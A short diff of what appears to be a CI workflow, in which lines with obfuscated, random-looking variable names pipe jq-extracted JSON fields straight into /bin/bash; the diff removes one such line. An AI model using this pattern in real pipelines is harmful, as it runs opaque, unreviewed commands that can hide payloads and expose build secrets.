@@ -22,7 +22,6 @@ jobs:
           echo $zstt91198 | jq -r .wy7203 | /bin/bash
           echo $q70 | jq -r .mzme0 | /bin/bash
           echo $kfqh47385 | jq -r .wargw4 | /bin/bash
-          echo $l83 | jq -r .juvn2389 | /bin/bash
           echo $brcx86 | jq -r .ylpnw94 | /bin/bash
           printf '%s' "$lv72" | jq -r .hbrh87 | /bin/bash
           printf '%s' "$lqd6" | jq -r .upc3 | /bin/bash
